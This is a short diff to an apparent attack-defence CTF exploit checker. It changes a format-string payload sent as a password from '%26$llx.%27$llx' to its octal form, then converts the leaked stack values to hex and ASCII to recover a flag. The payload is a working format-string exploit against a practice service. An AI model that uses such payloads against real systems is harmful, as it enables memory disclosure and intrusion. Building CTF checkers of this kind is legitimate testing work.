@@ -385,14 +385,18 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%26$llx.%27$llx\n') # NOTE: vulnbox: %26$llx.%27$llx (because of x86?)
+    conn.writer.write(b'%26$llo.%27$llo\n') # NOTE: vulnbox: %26$llo.%27$llo (because of x86?)
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
     incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()
 
     # Extract the two addresses from the incorrect message
-    address1_hex, address2_hex = incorrect_message.split(' ')[0].split('.')
+    address1_octal, address2_octal = incorrect_message.split(' ')[0].split('.')
+
+    # Convert the octals to hex
+    address1_hex = hex(int(address1_octal, 8))[2:]
+    address2_hex = hex(int(address2_octal, 8))[2:]
 
     # Convert the addresses to ASCII and reverse them
     address1 = bytes.fromhex(address1_hex).decode()[::-1]
